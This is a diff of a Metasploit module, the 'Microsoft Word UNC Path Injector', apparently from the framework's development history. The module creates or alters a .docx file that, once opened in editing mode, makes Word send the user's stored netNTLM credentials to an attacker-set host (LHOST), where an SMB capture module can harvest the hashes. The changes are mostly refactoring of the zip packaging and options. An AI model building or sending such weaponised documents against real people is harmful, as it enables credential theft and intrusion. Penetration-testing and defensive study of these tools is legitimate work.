@@ -17,30 +17,30 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => 'Microsoft Word UNC Path Injector',
 			'Description'    => %q{
-					This module modifies a .docx file that will, upon opening, submit all
-					stored netNTLM credentials to a remote host. It can also create an empty docx file.
-					If emailed the receiver needs to put the document in editing mode
-					before the remote server will be contacted. Preview and read-only
-					mode do not work. Verified to work with Microsoft Word 2003,
-					2007 and 2010 as of January 2013 date by using auxiliary/server/capture/smb
+					This module modifies a .docx file that will, upon opening, submit stored
+				netNTLM credentials to a remote host. It can also create an empty docx file. If
+				emailed the receiver needs to put the document in editing mode before the remote
+				server will be contacted. Preview and read-only mode do not work. Verified to work
+				with Microsoft Word 2003, 2007 and 2010 as of January 2013. In order to get the
+				hashes the auxiliary/server/capture/smb module can be used.
 			},
 			'License'        => MSF_LICENSE,
 			'References'     =>
-			[
-				[ 'URL', 'http://jedicorp.com/?p=534' ],
-			],
+				[
+					[ 'URL', 'http://jedicorp.com/?p=534' ]
+				],
 			'Author'         =>
-			[
-				'SphaZ <cyberphaz[at]gmail.com>'
-			]
+				[
+					'SphaZ <cyberphaz[at]gmail.com>'
+				]
 		))
 
 		register_options(
 			[
-				OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to.','']),
-				OptPath.new('SOURCE', [false, 'Full path and filename of .docx file to use as source. If empty, creates new document', '']),
-				OptString.new('FILENAME', [true, 'Document output filename.', 'stealnetNTLM.docx']),
-				OptString.new('DOCAUTHOR',[false,'Document author for empty document.', '']),
+				OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to.']),
+				OptPath.new('SOURCE', [false, 'Full path and filename of .docx file to use as source. If empty, creates new document.']),
+				OptString.new('FILENAME', [true, 'Document output filename.', 'msf.docx']),
+				OptString.new('DOCAUTHOR',[false,'Document author for empty document.']),
 			], self.class)
 	end
 
@@ -59,24 +59,26 @@ class Metasploit3 < Msf::Auxiliary
 		#where to find the skeleton files required for creating an empty document
 		data_dir = File.join(Msf::Config.install_root, "data", "exploits", "docx")
 
-		#making the actual docx
-		docx = Rex::Zip::Archive.new
+		zip_data = {}
+
 		#add skeleton files
 		vprint_status("Adding skeleton files from #{data_dir}")
 		Dir["#{data_dir}/**/**"].each do |file|
 			if not File.directory?(file)
-				docx.add_file(file.sub(data_dir,''), File.read(file))
+				zip_data[file.sub(data_dir,'')] = File.read(file)
 			end
 		end
+
 		#add on-the-fly created documents
 		vprint_status("Adding injected files")
-		docx.add_file("docProps/core.xml", metadata_file_data)
-		docx.add_file("word/_rels/settings.xml.rels", @rels_file_data)
+		zip_data["docProps/core.xml"] = metadata_file_data
+		zip_data["word/_rels/settings.xml.rels"] = @rels_file_data
+
 		#add the otherwise skipped "hidden" file
 		file = "#{data_dir}/_rels/.rels"
-		docx.add_file(file.sub(data_dir,''), File.read(file))
+		zip_data[file.sub(data_dir,'')] = File.read(file)
 		#and lets create the file
-		file_create(docx.pack)
+		zip_docx(zip_data)
 	end
 
 	#here we inject an UNC path into an existing file, and store the injected file in FILENAME
@@ -177,7 +179,9 @@ class Metasploit3 < Msf::Auxiliary
 		else
 			#extract the word/settings.xml and edit in the reference we need
 			print_status("Injecting UNC path into existing document.")
-			if not manipulate_file.nil?
+			if manipulate_file.nil?
+				print_error("Failed to create a document from #{datastore['SOURCE']}.")
+			else
 				print_good("Copy of #{datastore['SOURCE']} called #{datastore['FILENAME']} points to #{datastore['LHOST']}.")
 			end
 		end
